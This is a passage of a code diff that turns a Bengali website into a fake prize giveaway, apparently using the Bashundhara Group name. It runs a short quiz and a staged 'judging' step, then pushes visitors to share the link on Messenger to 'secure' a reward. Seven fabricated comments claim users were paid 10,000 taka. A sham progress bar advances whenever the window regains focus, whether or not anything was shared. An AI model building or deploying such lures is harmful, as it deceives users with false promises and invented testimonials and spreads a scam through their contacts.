+            <div class="share-instruction">পুরস্কার নিশ্চিত করতে ১০ জন বন্ধুর সঙ্গে শেয়ার করুন।<br>নিচের দাগ নীল হওয়া পর্যন্ত শেয়ার করুন।</div>
+            
+            <div class="share-buttons">
+                <!-- ONLY Messenger Button -->
+                <button id="messengerShareBtn" class="share-btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M12 2C6.36 2 2 6.13 2 11.7c0 2.91 1.19 5.44 3.14 7.17.16.13.26.33.26.54v3.08c0 .45.46.75.85.56l2.93-1.47c.5-.25.86-.74.97-1.27.54.17 1.1.26 1.69.26 5.64 0 10-4.13 10-9.7C22 6.13 17.64 2 12 2z"/>
+                    </svg>
+                    Messenger
+                </button>
+            </div>
+
+            <!-- Clean progress line - NO TEXT, just the bar -->
+            <div class="progress-line-container">
+                <div class="progress-track">
+                    <div id="progressFill" class="progress-fill" style="width: 0%;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Facebook-style Comments Section -->
+    <div class="comments-section">
+        <div class="comments-container">
+            <div class="comments-header">
+                <h3>মন্তব্য</h3>
+                <span>৭টি</span>
+            </div>
+
+            <!-- Comment 1 -->
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/1.jpeg" alt="Sifatul Islam" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.style.display='flex'; this.parentElement.style.alignItems='center'; this.parentElement.style.justifyContent='center'; this.parentElement.style.color='white'; this.parentElement.innerHTML='S';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Sifatul Islam</div>
+                        <div class="comment-text">হ্যাঁ আমি ১০ জন বন্ধুকে শেয়ার করে ১০ হাজার টাকা পেয়েছি 😊</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>৮ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/2.jpeg" alt="Nahidul" onerror="this.style.display='none'; this.parentElement.style.background='#1877F2'; this.parentElement.innerHTML='N';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Nahidul</div>
+                        <div class="comment-text">হ্যাঁ আমিও টাকা পেয়েছি, সত্যিই কাজ করে 👍</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>১৫ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/3.jpeg" alt="Monir Hossain" onerror="this.style.display='none'; this.parentElement.style.background='#42B72A'; this.parentElement.innerHTML='M';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Monir Hossain</div>
+                        <div class="comment-text">হ্যাঁ আমি শেয়ার করেছি আর পেমেন্ট রিসিভ করেছি, ধন্যবাদ</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>২৩ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/4.jpeg" alt="Ripon Kumar" onerror="this.style.display='none'; this.parentElement.style.background='#F7B125'; this.parentElement.innerHTML='R';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Ripon Kumar</div>
+                        <div class="comment-text">হ্যাঁ আমি টাকা পেয়েছি, প্রথমে বিশ্বাস হয়নি কিন্তু পেয়েছি</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>৩৪ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/5.jpeg" alt="Onamika" onerror="this.style.display='none'; this.parentElement.style.background='#E4405F'; this.parentElement.innerHTML='O';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Onamika</div>
+                        <div class="comment-text">হ্যাঁ আমিও পেয়েছি, খুব সহজ ছিল</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>৪৫ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/6.jpeg" alt="Ratul Ahmed" onerror="this.style.display='none'; this.parentElement.style.background='#1DA1F2'; this.parentElement.innerHTML='R';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Ratul Ahmed</div>
+                        <div class="comment-text">হ্যাঁ আমি ১০ জনকে শেয়ার করে টাকা পেয়েছি</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>৫২ মিনিট</span>
+                    </div>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="asset/7.jpeg" alt="Shafin Bhuiyan" onerror="this.style.display='none'; this.parentElement.style.background='#C41E3A'; this.parentElement.innerHTML='S';">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-bubble">
+                        <div class="comment-author">Shafin Bhuiyan</div>
+                        <div class="comment-text">হ্যাঁ আমিও টাকা পেয়েছি, সবাই ট্রাই করতে পারেন</div>
+                    </div>
+                    <div class="comment-meta">
+                        <span>লাইক</span>
+                        <span>উত্তর</span>
+                        <span>১ ঘন্টা</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div style="flex:1; background: #F0F2F5;"></div>
 
     <script>
-        // Elements
-        const menuToggle = document.getElementById('menuToggle');
-        const mobileNav = document.getElementById('mobileNav');
-        const navOverlay = document.getElementById('navOverlay');
-        const mobileLegalLink = document.getElementById('mobileLegalLink');
-        const mobileLegalDropdown = document.getElementById('mobileLegalDropdown');
-        const desktopLegalLink = document.getElementById('desktopLegalLink');
-        const desktopLegalDropdown = document.getElementById('desktopLegalDropdown');
-        const cardsContainer = document.getElementById('cardsContainer');
-
-        // Toggle mobile menu
-        function toggleMobileMenu() {
-            mobileNav.classList.toggle('active');
-            navOverlay.classList.toggle('active');
-
-            // Update menu icon
-            const icon = menuToggle.querySelector('i');
-            if (mobileNav.classList.contains('active')) {
-                icon.className = 'fas fa-times';
-                document.body.style.overflow = 'hidden';
-            } else {
-                icon.className = 'fas fa-bars';
-                document.body.style.overflow = '';
-                // Close dropdown when closing menu
-                mobileLegalDropdown.classList.remove('active');
+        // Questions data
+        const questions = [
+            {
+                text: "প্রশ্ন ১: আপনি কি বাংলাদেশের নাগরিক?",
+                options: ["হ্যাঁ", "না"]
+            },
+            {
+                text: "প্রশ্ন ২: আপনি কি বসুন্ধরা গ্রুপ সম্পর্কে জানেন?",
+                options: ["হ্যাঁ", "না"]
+            },
+            {
+                text: "প্রশ্ন ৩: আপনার বয়স কত?",
+                options: ["১৮ বছরের নিচে", "১৮–৩০ বছর", "৩০ বছরের ঊর্ধ্বে"]
             }
-        }
+        ];
 
-        // Toggle mobile legal dropdown
-        function toggleMobileLegalDropdown(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            mobileLegalDropdown.classList.toggle('active');
-        }
+        let currentQuestion = 0;
+        let shareCount = 0;
+        const REQUIRED_SHARES = 5;
 
-        // Desktop legal dropdown hover
-        desktopLegalLink.addEventListener('mouseenter', () => {
-            if (window.innerWidth > 768) {
-                desktopLegalDropdown.classList.add('active');
-                desktopLegalLink.classList.add('active');
-            }
-        });
+        // DOM elements
+        const questionSection = document.getElementById('questionSection');
+        const judgingSection = document.getElementById('judgingSection');
+        const shareSection = document.getElementById('shareSection');
+        const questionText = document.getElementById('questionText');
+        const optionsContainer = document.getElementById('optionsContainer');
+        const progressDots = document.getElementById('progressDots');
+        const progressFill = document.getElementById('progressFill');
 
-        // Hide desktop legal dropdown when mouse leaves
-        document.querySelector('.nav-item').addEventListener('mouseleave', () => {
-            if (window.innerWidth > 768) {
-                desktopLegalDropdown.classList.remove('active');
-                desktopLegalLink.classList.remove('active');
-            }
-        });
-
-        // Close mobile menu
-        function closeMobileMenu() {
-            mobileNav.classList.remove('active');
-            navOverlay.classList.remove('active');
-            menuToggle.querySelector('i').className = 'fas fa-bars';
-            document.body.style.overflow = '';
-            mobileLegalDropdown.classList.remove('active');
-        }
-
-        // Event listeners
-        menuToggle.addEventListener('click', toggleMobileMenu);
-        navOverlay.addEventListener('click', closeMobileMenu);
-        mobileLegalLink.addEventListener('click', toggleMobileLegalDropdown);
-
-        // Handle all navigation link clicks
-        document.querySelectorAll('nav a').forEach(link => {
-            link.addEventListener('click', (e) => {
-                // Don't prevent default for Legal dropdown toggles
-                if (link.classList.contains('legal-link')) {
-                    return;
-                }
-
-                // Allow default behavior for actual links
-                console.log(`Clicked: ${link.textContent.trim()}`);
-
-                // Close mobile menu on mobile
-                if (window.innerWidth <= 768) {
-                    closeMobileMenu();
-                }
+        // Function to load question
+        function loadQuestion(index) {
+            questionText.innerText = questions[index].text;
+            optionsContainer.innerHTML = '';
+            
+            questions[index].options.forEach((option) => {
+                const optionBtn = document.createElement('button');
+                optionBtn.className = 'option';
+                optionBtn.innerText = option;
+                optionBtn.onclick = () => {
+                    if (currentQuestion < questions.length - 1) {
+                        currentQuestion++;
+                        loadQuestion(currentQuestion);
+                        updateProgress(currentQuestion);
+                    } else {
+                        // Last question answered - show judging page
+                        questionSection.classList.add('hidden');
+                        judgingSection.classList.remove('hidden');
+                        
+                        // Auto transition to share page after 2.5 seconds
+                        setTimeout(() => {
+                            judgingSection.classList.add('hidden');
+                            shareSection.classList.remove('hidden');
+                            
+                            // Load saved share count from localStorage
+                            const savedCount = localStorage.getItem('bashundharaShareCount');
+                            if (savedCount) {
+                                shareCount = parseInt(savedCount);
+                                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
+                                progressFill.style.width = `${progressPercent}%`;
+                            }
+                        }, 2500);
+                    }
+                };
+                optionsContainer.appendChild(optionBtn);
             });
-        });
+        }
 
-        // Handle legal dropdown item clicks (these should navigate normally)
-        document.querySelectorAll('.legal-dropdown a, .desktop-legal-dropdown a').forEach(link => {
-            link.addEventListener('click', (e) => {
-                console.log(`Clicked: ${link.textContent.trim()}`);
-
-                // Close mobile menu on mobile
-                if (window.innerWidth <= 768) {
-                    closeMobileMenu();
+        // Update progress dots
+        function updateProgress(index) {
+            const dots = progressDots.children;
+            for (let i = 0; i < dots.length; i++) {
+                if (i === index) {
+                    dots[i].classList.add('active');
+                } else {
+                    dots[i].classList.remove('active');
                 }
-
-                // Close desktop dropdown
-                if (window.innerWidth > 768) {
-                    desktopLegalDropdown.classList.remove('active');
-                    desktopLegalLink.classList.remove('active');
-                }
-                
-                // Allow normal navigation for these links
-            });
-        });
-
-        // Update copyright year
-        document.getElementById('currentYear').textContent = new Date().getFullYear();
-
-        // Close menu on escape key
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && mobileNav.classList.contains('active')) {
-                closeMobileMenu();
-            }
-        });
-
-        // Close menu on resize if switching to desktop
-        window.addEventListener('resize', () => {
-            if (window.innerWidth > 768 && mobileNav.classList.contains('active')) {
-                closeMobileMenu();
-            }
-        });
-
-        // Load and display cards from JSON
-        async function loadCards() {
-            try {
-                const response = await fetch('main.json');
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                
-                // Clear loading message
-                cardsContainer.innerHTML = '';
-                
-                // Check if data is an array and has items
-                if (!Array.isArray(data) || data.length === 0) {
-                    cardsContainer.innerHTML = `
-                        <div class="error">
-                            <i class="fas fa-exclamation-triangle"></i>
-                            <p>No content available. Please check the JSON file.</p>
-                        </div>
-                    `;
-                    return;
-                }
-                
-                // Sort by id (last one appears first)
-                const sortedData = [...data].sort((a, b) => b.id - a.id);
-                
-                // Create cards
-                sortedData.forEach(item => {
-                    const card = document.createElement('div');
-                    card.className = 'card';
-                    card.setAttribute('data-id', item.id);
-                    
-                    // Format date if provided
-                    let dateDisplay = item.date || 'Date not specified';
-                    
-                    card.innerHTML = `
-                        <img src="${item.image}" alt="${item.title}" class="card-image" onerror="this.src='https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80'">
-                        <div class="card-content">
-                            <h3 class="card-title">${item.title}</h3>
-                            <div class="card-meta">
-                                <div class="card-views">
-                                    <i class="fas fa-eye"></i>
-                                    <span>${item.views} views</span>
-                                </div>
-                                <div class="card-date">
-                                    <i class="far fa-calendar-alt"></i>
-                                    <span>${dateDisplay}</span>
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    
-                    // Add click event to redirect
-                    card.addEventListener('click', () => {
-                        if (item.path) {
-                            window.location.href = item.path;
-                        } else {
-                            console.error('No path specified for this card');
-                        }
-                    });
-                    
-                    cardsContainer.appendChild(card);
-                });
-                
-            } catch (error) {
-                console.error('Error loading cards:', error);
-                cardsContainer.innerHTML = `
-                    <div class="error">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <p>Failed to load content. Please try again later.</p>
-                        <p style="font-size: 0.8rem; margin-top: 0.5rem;">${error.message}</p>
-                    </div>
-                `;
             }
         }
 
-        // Load cards when page loads
-        document.addEventListener('DOMContentLoaded', loadCards);
+        // Share function - opens Messenger
+        function handleShare() {
+            const siteUrl = window.location.href;
+            window.open(`fb-messenger://share?link=${encodeURIComponent(siteUrl)}`, '_blank');
+        }
+
+        // Track when user comes back to the page
+        window.addEventListener('focus', function() {
+            // Only count if share section is visible and not completed
+            if (!shareSection.classList.contains('hidden') && shareCount < REQUIRED_SHARES) {
+                // Increment share count
+                shareCount++;
+                
+                // Save to localStorage
+                localStorage.setItem('bashundharaShareCount', shareCount);
+                
+                // Calculate progress percentage
+                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
+                progressFill.style.width = `${progressPercent}%`;
+                
+                // Stay on share section - NO redirect, NO hide
+                // User can share again immediately
+                
+                // Optional: when completed
+                if (shareCount === REQUIRED_SHARES) {
+                    setTimeout(() => {
+                        alert('🎉 অভিনন্দন! আপনি সফলভাবে পুরস্কার নিশ্চিত করেছেন!');
+                    }, 500);
+                }
+            }
+        });
+
+        // Event listener for Messenger button
+        document.getElementById('messengerShareBtn').addEventListener('click', handleShare);
+
+        // Load first question
+        loadQuestion(0);
+        
+        // Clear localStorage for testing (remove this line in production)
+        // localStorage.removeItem('bashundharaShareCount');
     </script>
 </body>
 </html>
